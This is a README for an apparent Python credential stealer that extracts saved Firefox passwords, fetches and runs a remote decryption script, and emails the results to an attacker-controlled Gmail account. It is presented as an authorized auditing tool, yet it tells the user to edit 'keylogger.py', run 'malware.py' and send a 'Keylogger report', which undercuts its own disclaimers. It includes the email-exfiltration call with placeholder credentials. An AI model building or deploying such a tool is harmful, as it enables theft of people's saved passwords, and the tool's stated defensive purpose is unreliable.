# Firefox Credentials Extractor

A Python-based security testing tool for extracting and analyzing saved Firefox browser credentials from systems. This utility leverages the [`firefox_decrypt.py`](https://github.com/unode/firefox_decrypt) library to demonstrate password storage vulnerabilities in Firefox profiles.

> [!WARNING] This tool is designed **exclusively for authorized security testing, educational purposes, and legitimate system administration**. Only use this tool on systems you own or have explicit written permission to test. Unauthorized access to credentials is illegal and may result in severe legal consequences.

----------

## Features

-   **Automated Profile Discovery**: Automatically locates Firefox profile directories across different operating systems
-   **Dynamic Script Retrieval**: Downloads and executes the latest version of `firefox_decrypt.py`
-   **Comprehensive Extraction**: Retrieves all stored login credentials from Firefox password manager
-   **Secure Reporting**: Optional encrypted email delivery of audit results via SMTP

> [!IMPORTANT] When using Gmail SMTP, you must either enable "App Passwords" (recommended) or configure application-specific authentication. Standard Gmail passwords will not work due to security restrictions.

----------

## Prerequisites

> [!NOTE] Ensure you have the following installed before running the tool:

-   **Python 3.7+** (Python 3.8+ recommended for optimal compatibility)
-   **requests** library for HTTP operations
-   **Active internet connection** (required for downloading firefox_decrypt.py)

### Installing Dependencies

```bash
pip install requests
```

> [!TIP] For production environments, consider using a virtual environment:

```bash
python -m venv firefox-auditor-env
source firefox-auditor-env/bin/activate  # On Windows: firefox-auditor-env\Scripts\activate
pip install requests
```

----------

## Configuration


### Email Setup

> [!IMPORTANT]
> Gmail App Password Configuration Required

Before using the keylogger, you must configure Gmail App Passwords:

1. Enable 2-Factor Authentication on your Gmail account
2. Generate an App Password:
   - Go to Google Account settings
   - Security → 2-Step Verification → App passwords
   - Generate a new app password
3. Update the email configuration in `keylogger.py`:

```python
self.send_emails("Keylogger report", email_body, 
                "youremail@gmail.com",           # Sender email
                ["youremail@gmail.com"],         # Recipients list
                "aaaa bbbb cccc dddd")           # App password (16 characters)
```

> [!CAUTION]
> Never commit your actual email credentials to version control. Consider using environment variables for sensitive information.

----------

## Usage

### Basic Operation

```bash
python malware.py
```

## Security Considerations

> [!IMPORTANT] **Legal Compliance**: This tool should only be used in compliance with:
> 
> -   Local and international cybersecurity laws
> -   Organizational security policies
> -   Authorized penetration testing agreements
> -   Educational institution guidelines

----------

## Troubleshooting

### Common Issues

**Firefox Profile Not Found**

-   Ensure Firefox has been run at least once on the target system
-   Check if Firefox is installed in a non-standard location
-   Verify user permissions to access the profile directory

**SMTP Authentication Failures**

-   Confirm App Password is correctly configured for Gmail
-   Verify SMTP settings for non-Gmail providers

**Module Import Errors**

-   Install required dependencies using pip
-   Verify Python version compatibility
-   Check virtual environment activation

> [!NOTE] For additional support, please refer to the [firefox_decrypt documentation](https://github.com/unode/firefox_decrypt) for Firefox-specific issues.

----------

## Disclaimer

> [!CAUTION] The authors and contributors of this tool are not responsible for any misuse or damage caused by this software. Users are solely responsible for ensuring their use of this tool complies with applicable laws and regulations. This tool is provided "as-is" without any warranties or guarantees.


## Author

Developed by **Marco Becerra**

